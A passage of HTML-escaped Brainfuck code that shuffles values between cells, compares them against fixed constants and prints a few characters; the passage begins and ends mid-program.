lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;[&lt;&lt;+&gt;&gt;-]&lt;[&lt;[&lt;+&gt;-]&gt;-[&lt;+&gt;-]&lt;][-]&gt;[-]++++++++[&lt;++++++++++++&gt;-]&lt;+&gt;&lt;&lt;[-&gt;-&lt;]+&gt;[&lt;-&gt;[-]]&lt;[&lt;+&gt;[-]]]&lt;[[-][-]+++&gt;[-]&lt;[&gt;&gt;[-]+&lt;[&gt;+&lt;-]&lt;-[&gt;+&lt;-]&gt;]&gt;&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;[&lt;&lt;+&gt;&gt;-]&lt;[&lt;[&lt;+&gt;-]&gt;-[&lt;+&gt;-]&lt;][-]&gt;[-]++++++++[&lt;+++++++++++++&gt;-]&lt;-&gt;&lt;&lt;[-&gt;-&lt;]+&gt;[&lt;-&gt;[-]]&lt;[&lt;+&gt;[-]]]&lt;[[-][-]++++&gt;[-]&lt;[&gt;&gt;[-]+&lt;[&gt;+&lt;-]&lt;-[&gt;+&lt;-]&gt;]&gt;&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;[&lt;&lt;+&gt;&gt;-]&lt;[&lt;[&lt;+&gt;-]&gt;-[&lt;+&gt;-]&lt;][-]&gt;[-]+++++++++++[&lt;+++++++++++&gt;-]&lt;++&gt;&lt;&lt;[-&gt;-&lt;]+&gt;[&lt;-&gt;[-]]&lt;[&lt;+&gt;[-]]]&lt;[[-][-]&gt;[-]++++++[&lt;++++++&gt;-]&lt;+&gt;[-]&lt;[&gt;&gt;[-]+&lt;[&gt;+&lt;-]&lt;-[&gt;+&lt;-]&gt;]&gt;&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;[&lt;&lt;+&gt;&gt;-]&lt;[&lt;[&lt;+&gt;-]&gt;-[&lt;+&gt;-]&lt;][-]&gt;[-]+++++++++[&lt;++++++++++++++&gt;-]&lt;-&gt;&lt;&lt;[-&gt;-&lt;]+&gt;[&lt;-&gt;[-]]&lt;[&lt;+&gt;[-]]]&lt;&gt;[-]&lt;&lt;[-]&gt;[&gt;+&lt;&lt;+&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;[-]&gt;[-]+&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&gt;[-]+&lt;[&gt;-&lt;[-]]&gt;[&lt;+&gt;-]&lt;[&lt;&lt;+&gt;-&gt;[-]]&lt;[[-]&gt;[-]&lt;&lt;&lt;[&gt;&gt;+&gt;+&lt;&lt;&lt;-]&gt;&gt;&gt;[&lt;&lt;&lt;+&gt;&gt;&gt;-]&lt;&gt;[-]+&lt;[&gt;-&lt;[-]]&gt;[&lt;+&gt;-]&lt;[&lt;+&gt;[-]]][-]+&lt;[&gt;-&gt;[-]&gt;[-]&lt;&gt;++++++++++[&lt;+++++++++++&gt;-]&lt;.+.-.+.-.+.&lt;&lt;[-]]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-]+&gt;&lt;&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-]&gt;[-]+++++++[&lt;++++++++++++&gt;-]&lt;-&gt;[-]+++++++++++++++&gt;[-]&gt;[-]+++++++++[&lt;++++++++++&gt;-]&lt;&gt;[-]&gt;[-]+++++++[&lt;++++++++++++&gt;-]&lt;&gt;[-]&gt;[-]++++++++[&lt;++++++++++&gt;-]&lt;&gt;[-]&gt;[-]+++++++[&lt;++++++++++++&gt;-]&lt;+&gt;[-]+++&gt;[-]++&gt;[-]&gt;[-]+++++++&gt;[-]&gt;[-]+++++++[&lt;++++++++++++&gt;-]&lt;++&gt;[-]+++++++&gt;[-]+++++++&gt;[-]&gt;[-]+++++++[&lt;+++++++++++++&gt;-]&lt;&gt;[-]+++++++++&gt;[-]&gt;[-]&gt;[-]++++++++[&lt;++++++++++&gt;-]&lt;&gt;[-]+++++&gt;[-]++&gt;[-]+++&gt;[-]&gt;[-]+++++++[&lt;+++++++++++++&gt;-]&lt;++&gt;[-]&gt;[-]+++++++[&lt;+++++++++++++&gt;-]&lt;+&gt;[-]&gt;[-]++++++++[&lt;++++++++++&gt;-]&lt;&gt;[-]&gt;[-]+++++++++[&lt;+++++++++&gt;-]&lt;&gt;[-]&gt;[-]+++++++++[&lt;+++++++++&gt;-]&lt;+&gt;[-]&gt;[-]+++++++[&lt;++++++++++++&gt;-]&lt;&gt;[-]&gt;[-]+++++++++[&lt;++++++++++&gt;-]&lt;&gt;[-]&gt;[-]++++++++[&lt;++++++++++++&gt;-]&lt;-&gt;[-]++&gt;[-]&gt;[-]++++++++[&lt;+++++++++++&gt;-]&lt;-&gt;[-]+++++++&gt;[-]&gt;[-]++++[&lt;+++++++++++++&gt;-]&lt;&gt;&gt;&lt;[-]+++++&gt;&lt;&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-][-]&gt;[-]++++++[&lt;++++++&gt;-]&lt;&gt;&lt;&lt;&gt;&gt;[-]&gt;[-]&lt;&lt;[&gt;[-]&lt;&lt;[&gt;&gt;+&gt;+&lt;&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]+&gt;[[-]&lt;-&lt;&lt;-&gt;&gt;&gt;]&lt;&lt;-]&lt;[-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]&lt;&lt;[[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-][-]&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-][-]&lt;[&gt;&gt;[-]+&lt;[&gt;+&lt;-]&lt;-[&gt;+&lt;-]&gt;]&gt;&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;[&lt;&lt;+&gt;&gt;-]&lt;[&lt;[&lt;+&gt;-]&gt;-[&lt;+&gt;-]&lt;][-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-][-]+&gt;&lt;&lt;&gt;[&lt;+&gt;-][-]&lt;[&gt;&gt;[-]+&lt;[&gt;+&lt;-]&lt;-[&gt;+&lt;-]&gt;]&gt;&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&